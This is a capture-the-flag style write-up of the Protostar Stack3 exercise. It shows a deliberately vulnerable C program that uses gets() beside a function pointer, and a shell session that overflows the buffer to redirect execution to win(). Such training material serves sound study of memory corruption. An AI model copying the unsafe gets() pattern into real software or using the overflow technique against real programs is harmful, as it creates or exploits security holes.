#### Stack3

###### About

- Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

- Hints
	- Both ``gdb`` and ``objdump`` is your friend you determining where the ``win()`` function lies in memory.
	
- This level is at ``/opt/protostar/bin/stack3``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./stack3
AAAAAA
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*68" | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 <win>:
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64 +'\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$
```



